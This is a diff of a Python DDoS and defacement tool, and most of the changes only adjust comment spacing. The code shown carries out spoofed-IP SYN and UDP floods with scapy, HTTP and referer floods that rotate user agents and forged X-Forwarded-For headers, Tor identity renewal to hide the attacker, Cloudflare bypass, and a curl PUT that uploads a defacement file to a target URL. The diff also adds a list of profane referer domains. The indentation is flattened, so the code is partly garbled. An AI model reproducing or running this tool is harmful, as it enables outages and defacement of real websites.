@@ -23,43 +23,43 @@
  import os
  import sys
  import requests
- import socks  # Import the PySocks library
- from scapy.all import *  # Network Scanning Tools for DOS and DDOS attacks
+ import socks # Import the PySocks library
+ from scapy.all import * # Network Scanning Tools for DOS and DDOS attacks
  import traceback
- import stem.process  # For launching Tor
+ import stem.process # For launching Tor
  from stem import Signal
  from stem.util.log import get_logger
  import urllib3
  from urllib.parse import urlparse
- import cfscrape  # Bypass Cloudflare
+ import cfscrape # Bypass Cloudflare
  from contextlib import suppress
  from queue import Queue
  import signal
- import subprocess  # For defacement tool
- import shutil  # For file backups
- import hashlib  # For secure key management
+ import subprocess # For defacement tool
+ import shutil # For file backups
+ import hashlib # For secure key management
  from cryptography.fernet import Fernet
  from cryptography.hazmat.primitives import hashes
  from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
  from cryptography.hazmat.backends import default_backend
  import base64
- import asyncio  # For asynchronous operations
- import aiohttp  # For asynchronous HTTP requests
- from PyQt5.QtWidgets import QApplication, QMessageBox, QLabel  # User consent popup
+ import asyncio # For asynchronous operations
+ import aiohttp # For asynchronous HTTP requests
+ from PyQt5.QtWidgets import QApplication, QMessageBox, QLabel # User consent popup
  from PyQt5.QtCore import Qt, QTimer
  from PyQt5.QtGui import QPalette, QColor
  
 
  # Configuration
- TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
+ TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m") # Dark Green
  parsed_url = urlparse(TARGET)
  PORT = int(sys.argv[2]) if len(sys.argv) > 2 else (443 if parsed_url.scheme == 'https' else 80)
  THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
- PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 65500  # MAXIMUM TCP SIZE
+ PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 65500 # MAXIMUM TCP SIZE
  TIMEOUT = 2
- USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
- TOR_PORT = 9050  # Default Tor port
- CONTROL_PORT = 9051  # Tor control port
+ USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y' # Dark Green
+ TOR_PORT = 9050 # Default Tor port
+ CONTROL_PORT = 9051 # Tor control port
  BYPASS_CLOUDFLARE = True
  DEFACE_URL = input("\033[32mEnter URL for defacement tool (optional): \033[0m")
  ENCRYPT_FILE = input("\033[32mEnter path for file encryption tool (optional): \033[0m")
@@ -104,7 +104,7 @@
  # Function to generate a random IP address (for spoofing)
  def generate_random_ip():
   ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-  log(f"\033[35mGenerated spoofed IP: {ip}\033[0m")  # Purple
+  log(f"\033[35mGenerated spoofed IP: {ip}\033[0m") # Purple
   return ip
  
 
@@ -122,14 +122,14 @@
   try:
   ip = socket.gethostbyname(target)
   except socket.gaierror:
-  log(f"\033[31mCould not resolve host: {target}\033[0m")  # Dark Red
+  log(f"\033[31mCould not resolve host: {target}\033[0m") # Dark Red
   return
  
 
   # Connect via Tor if USE_TOR is True
   if use_tor:
-  socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_PORT)  # Default Tor port
-  socket.socket = socks.socksocket  # Use SOCKS socket
+  socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_PORT) # Default Tor port
+  socket.socket = socks.socksocket # Use SOCKS socket
  
 
   s.connect((ip, port))
@@ -144,7 +144,7 @@
   f"GET / HTTP/1.1\r\n"
   f"Host: {target}\r\n"
   f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-  f"X-Forwarded-For: {generate_random_ip()}\r\n"  # Spoof IP
+  f"X-Forwarded-For: {generate_random_ip()}\r\n" # Spoof IP
   f"Connection: Keep-Alive\r\n"
   f"Cache-Control: max-age=0\r\n"
   f"\r\n"
@@ -156,16 +156,16 @@
   s.send(payload.encode('utf-8'))
  
 
-  log(f"\033[34mSent {len(payload)} bytes to {target}:{port}\033[0m")  # Dark Blue
+  log(f"\033[34mSent {len(payload)} bytes to {target}:{port}\033[0m") # Dark Blue
   s.close()
  
 
   # Add a slight delay to avoid overwhelming the system
-  time.sleep(random.uniform(0.01, 0.1))  # Faster than before
+  time.sleep(random.uniform(0.01, 0.1)) # Faster than before
   except socket.error as e:
-  log(f"\033[31mSocket error: {e}\033[0m")  # Dark Red
+  log(f"\033[31mSocket error: {e}\033[0m") # Dark Red
   except Exception as e:
-  log(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
+  log(f"\033[31mAn unexpected error occurred: {e}\033[0m") # Dark Red
   log(traceback.format_exc())
  
 
@@ -178,14 +178,14 @@
   # Craft a SYN packet
   ip = IP(src=generate_random_ip(), dst=target_ip)
   syn = TCP(sport=RandShort(), dport=target_port, flags='S')
-  raw = Raw(b"X" * 65500)  # Maximum Packet Size
+  raw = Raw(b"X" * 65500) # Maximum Packet Size
   p = ip / syn / raw
  
 
   # Send the packet
   send(p, verbose=0)
   except Exception as e:
-  log(f"\033[31mAn unexpected error occurred in syn_flood: {e}\033[0m")  # Dark Red
+  log(f"\033[31mAn unexpected error occurred in syn_flood: {e}\033[0m") # Dark Red
   log(traceback.format_exc())
  
 
@@ -197,14 +197,14 @@
   # Craft a UDP packet
   ip = IP(src=generate_random_ip(), dst=target_ip)
   udp = UDP(sport=RandShort(), dport=target_port)
-  raw = Raw(b"X" * 65500)  # Maximum Packet Size
+  raw = Raw(b"X" * 65500) # Maximum Packet Size
   p = ip / udp / raw
  
 
   # Send the packet
   send(p, verbose=0)
   except Exception as e:
-  log(f"\033[31mAn unexpected error occurred in udp_flood: {e}\033[0m")  # Dark Red
+  log(f"\033[31mAn unexpected error occurred in udp_flood: {e}\033[0m") # Dark Red
   log(traceback.format_exc())
  
 
@@ -214,11 +214,11 @@
  def renew_tor_identity():
   try:
   with Controller.from_port(port=CONTROL_PORT) as controller:
-  controller.authenticate(password="your_tor_control_password")  # Replace with your Tor control password if set
+  controller.authenticate(password="your_tor_control_password") # Replace with your Tor control password if set
   controller.signal(Signal.NEWNYM)
-  log("\033[32mSuccessfully renewed Tor identity.\033[0m")  # Dark Green
+  log("\033[32mSuccessfully renewed Tor identity.\033[0m") # Dark Green
   except Exception as e:
-  log(f"\033[31mFailed to renew Tor identity: {e}\033[0m")  # Dark Red
+  log(f"\033[31mFailed to renew Tor identity: {e}\033[0m") # Dark Red
  
 
  
@@ -240,7 +240,7 @@
   "https://www.ted.com/search?q=",
   "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
   "https://www.google.com/",
-  "https://www.cloudflare.com/",  # Bypass Cloudflare
+  "https://www.cloudflare.com/", # Bypass Cloudflare
   "https://www.bing.com/",
   "https://yandex.com/",
   "https://duckduckgo.com/",
@@ -281,7 +281,12 @@
   "https://www.uptrends.com/tools/uptime-test",
   "https://www.dotcom-monitor.com/website-speed-test",
   "https://gtmetrix.com/",
-  "https://developers.google.com/speed/pagespeed/insights/"
+  "https://developers.google.com/speed/pagespeed/insights/",
+  "https://fuckyou.com/",
+  "https://fuckthis.com/",
+  "https://whothefuckcares.com/",
+  "https://ihateyou.com/",
+  "https://diebitchdie.com/"
  ]
  
 
@@ -303,16 +308,16 @@
 
   # Check if the request was successful
   if response.status_code == 200:
-  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
+  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m") # Dark Green
   return True
   else:
-  log(f"\033[31mFailed to bypass Cloudflare. Status code: {response.status_code}\033[0m")  # Dark Red
+  log(f"\033[31mFailed to bypass Cloudflare. Status code: {response.status_code}\033[0m") # Dark Red
   return False
   except cfscrape.exceptions.CloudflareChallengeError as e:
-  log(f"\033[31mCloudflare challenge error: {e}\033[0m")  # Dark Red
+  log(f"\033[31mCloudflare challenge error: {e}\033[0m") # Dark Red
   return False
   except requests.exceptions.RequestException as e:
-  log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
+  log(f"\033[31mRequest error: {e}\033[0m") # Dark Red
   return False
   except Exception as e:
   log(f"\033[31mAn unexpected error occurred during Cloudflare bypass: {e}\033[0m")
@@ -335,20 +340,20 @@
   if BYPASS_CLOUDFLARE:
   bypassed = bypass_cloudflare(target)
   if bypassed:
-  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
+  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m") # Dark Green
   else:
-  log("\033[31mFailed to bypass Cloudflare.\033[0m")  # Dark Red
+  log("\033[31mFailed to bypass Cloudflare.\033[0m") # Dark Red
  
 
   requests.get(target, headers={'Referer': referer, 'User-Agent': random.choice(USER_AGENTS)},
   proxies=proxies, timeout=TIMEOUT)
-  log(f"\033[34mSent referer: {referer} to {target}\033[0m")  # Dark Blue
+  log(f"\033[34mSent referer: {referer} to {target}\033[0m") # Dark Blue
   except requests.exceptions.RequestException as e:
-  log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
+  log(f"\033[31mRequest error: {e}\033[0m") # Dark Red
   except Exception as e:
-  log(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
+  log(f"\033[31mAn unexpected error occurred: {e}\033[0m") # Dark Red
   log(traceback.format_exc())
-  time.sleep(random.uniform(0.01, 0.1))  # Faster Rate
+  time.sleep(random.uniform(0.01, 0.1)) # Faster Rate
  
 
  
@@ -382,12 +387,12 @@
   task_queue.put(lambda: udp_flood(socket.gethostbyname(target), port))
   # Start threads for referer attacks
   task_queue.put(lambda: referer_attack(target, use_tor))
-  log(f"\033[32mStarting referer attack on {target} with {threads} threads...\033[0m")  # Dark Green
-  log(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
+  log(f"\033[32mStarting referer attack on {target} with {threads} threads...\033[0m") # Dark Green
+  log(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m") # Dark Green
  
 
   # Create worker threads
-  for _ in range(threads * 4):  # Multiply by 4 since there are 4 types of attacks
+  for _ in range(threads * 4): # Multiply by 4 since there are 4 types of attacks
   t = threading.Thread(target=worker)
   t.daemon = True
   threads.append(t)
@@ -403,9 +408,9 @@
  def stop_attack():
   global attack_running, timer
   attack_running = False
-  task_queue.join()  # Wait for all tasks to be completed
+  task_queue.join() # Wait for all tasks to be completed
   for t in threads:
-  t.join(timeout=1)  # Wait for threads to finish
+  t.join(timeout=1) # Wait for threads to finish
   timer.stop()
   log("\033[31mStopping all attack threads...\033[0m")
  
@@ -436,8 +441,8 @@
  
 
   # Fetch the website content
-  response = requests.get(url, verify=False)  # Disable SSL verification temporarily
-  response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
+  response = requests.get(url, verify=False) # Disable SSL verification temporarily
+  response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
  
 
   # Create a unique filename for the backup
@@ -451,15 +456,15 @@
   f.write(response.content)
  
 
-  log(f"\033[32mWebsite backed up successfully to {filepath}\033[0m")  # Dark Green
+  log(f"\033[32mWebsite backed up successfully to {filepath}\033[0m") # Dark Green
   return filepath
  
 
   except requests.exceptions.RequestException as e:
-  log(f"\033[31mRequest error during backup: {e}\033[0m")  # Dark Red
+  log(f"\033[31mRequest error during backup: {e}\033[0m") # Dark Red
   return None
   except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during backup: {e}\033[0m")  # Dark Red
+  log(f"\033[31mAn unexpected error occurred during backup: {e}\033[0m") # Dark Red
   log(traceback.format_exc())
   return None
  
@@ -478,17 +483,17 @@
  
 
   if result.returncode == 0:
-  log(f"\033[32mWebsite restored successfully from {filepath} to {url}\033[0m")  # Dark Green
+  log(f"\033[32mWebsite restored successfully from {filepath} to {url}\033[0m") # Dark Green
   log(f"\033[32m{result.stdout}\033[0m")
   else:
-  log(f"\033[31mFailed to restore website: {url}\033[0m")  # Dark Red
+  log(f"\033[31mFailed to restore website: {url}\033[0m") # Dark Red
   log(f"\033[31m{result.stderr}\033[0m")
  
 
   except FileNotFoundError:
-  log(f"\033[31mBackup file not found: {filepath}\033[0m")  # Dark Red
+  log(f"\033[31mBackup file not found: {filepath}\033[0m") # Dark Red
   except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during restoration: {e}\033[0m")  # Dark Red
+  log(f"\033[31mAn unexpected error occurred during restoration: {e}\033[0m") # Dark Red
   log(traceback.format_exc())
  
 
@@ -503,22 +508,22 @@
  
 
   # Use curl to upload the defacement code to the website
-  command = ["curl", "-X", "PUT", "--data-binary", f"@{filename}", url, "-k"]  # Added -k for ignoring SSL
+  command = ["curl", "-X", "PUT", "--data-binary", f"@{filename}", url, "-k"] # Added -k for ignoring SSL
   result = subprocess.run(command, capture_output=True, text=True)
  
 
   if result.returncode == 0:
-  log(f"\033[32mWebsite defaced successfully: {url}\033[0m")  # Dark Green
+  log(f"\033[32mWebsite defaced successfully: {url}\033[0m") # Dark Green
   log(f"\033[32m{result.stdout}\033[0m")
   else:
-  log(f"\033[31mFailed to deface website: {url}\033[0m")  # Dark Red
+  log(f"\033[31mFailed to deface website: {url}\033[0m") # Dark Red
   log(f"\033[31m{result.stderr}\033[0m")
  
 
   except FileNotFoundError:
-  log(f"\033[31mDefacement file not found: {filename}\033[0m")  # Dark Red
+  log(f"\033[31mDefacement file not found: {filename}\033[0m") # Dark Red
   except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during defacement: {e}\033[0m")  # Dark Red
+  log(f"\033[31mAn unexpected error occurred during defacement: {e}\033[0m") # Dark Red
   log(traceback.format_exc())
  
 
@@ -534,15 +539,15 @@
  def generate_key(password, salt=None):
   """Generates a secure encryption key from the password and salt."""
   if salt is None:
-  salt = os.urandom(16)  # Generate a new salt if none is provided
+  salt = os.urandom(16) # Generate a new salt if none is provided
  
 
   password_encoded = password.encode()
   kdf = PBKDF2HMAC(
   algorithm=hashes.SHA256(),
-  length=32,  # 32 bytes for Fernet key
+  length=32, # 32 bytes for Fernet key
   salt=salt,
-  iterations=100000,  # High iteration count for security
+  iterations=100000, # High iteration count for security
   backend=default_backend()
   )
   key = base64.urlsafe_b64encode(kdf.derive(password_encoded))
@@ -574,21 +579,21 @@
   # Create a backup of the original file
   backup_filepath = filepath + ".bak"
   shutil.copy(filepath, backup_filepath)
-  log(f"\033[32mOriginal file backed up to {backup_filepath}\033[0m")  # Dark Green
+  log(f"\033[32mOriginal file backed up to {backup_filepath}\033[0m") # Dark Green
  
 
   # Write the encrypted data to the file, along with the salt
   with open(filepath, "wb") as file:
-  file.write(salt)  # Write the salt
-  file.write(encrypted_data)  # Write the encrypted data
+  file.write(salt) # Write the salt
+  file.write(encrypted_data) # Write the encrypted data
  
 
-  log(f"\033[32mFile encrypted successfully: {filepath}\033[0m")  # Dark Green
+  log(f"\033[32mFile encrypted successfully: {filepath}\033[0m") # Dark Green
   return True
  
 
   except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during encryption: {e}\033[0m")  # Dark Red
+  log(f"\033[31mAn unexpected error occurred during encryption: {e}\033[0m") # Dark Red
   log(traceback.format_exc())
   return False
  
@@ -600,8 +605,8 @@
   try:
   # Read the salt and encrypted data from the file
   with open(filepath, "rb") as file:
-  salt = file.read(16)  # Read the salt (first 16 bytes)
-  encrypted_data = file.read()  # Read the rest of the data
+  salt = file.read(16) # Read the salt (first 16 bytes)
+  encrypted_data = file.read() # Read the rest of the data
  
 
   # Generate the key using the password and salt
@@ -621,12 +626,12 @@
   file.write(decrypted_data)
  
 
-  log(f"\033[32mFile decrypted successfully: {filepath}\033[0m")  # Dark Green
+  log(f"\033[32mFile decrypted successfully: {filepath}\033[0m") # Dark Green
   return True
  
 
   except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during decryption: {e}\033[0m")  # Dark Red
+  log(f"\033[31mAn unexpected error occurred during decryption: {e}\033[0m") # Dark Red
   log(traceback.format_exc())
   return False
  
@@ -657,14 +662,14 @@
  if __name__ == "__main__":
   # Consent popup
   app = QApplication(sys.argv)
-  app.setStyle("Fusion")  # Set a modern style
+  app.setStyle("Fusion") # Set a modern style
  
 
   # Dark color palette
   palette = QPalette()
-  palette.setColor(QPalette.Window, QColor(0, 0, 0))  # Black
-  palette.setColor(QPalette.WindowText, QColor(0, 255, 0))  # Dark Green
-  palette.setColor(QPalette.Base, QColor(30, 30, 30))  # Dark Gray
+  palette.setColor(QPalette.Window, QColor(0, 0, 0)) # Black
+  palette.setColor(QPalette.WindowText, QColor(0, 255, 0)) # Dark Green
+  palette.setColor(QPalette.Base, QColor(30, 30, 30)) # Dark Gray
   palette.setColor(QPalette.AlternateBase, QColor(30, 30, 30))
   palette.setColor(QPalette.ToolTipBase, QColor(0, 255, 0))
   palette.setColor(QPalette.ToolTipText, QColor(0, 255, 0))
@@ -672,7 +677,7 @@
   palette.setColor(QPalette.Button, QColor(30, 30, 30))
   palette.setColor(QPalette.ButtonText, QColor(0, 255, 0))
   palette.setColor(QPalette.BrightText, Qt.red)
-  palette.setColor(QPalette.Link, QColor(255, 0, 255))  # Purple
+  palette.setColor(QPalette.Link, QColor(255, 0, 255)) # Purple
   palette.setColor(QPalette.Highlight, QColor(255, 0, 255))
   palette.setColor(QPalette.HighlightedText, QColor(0, 0, 0))
   app.setPalette(palette)
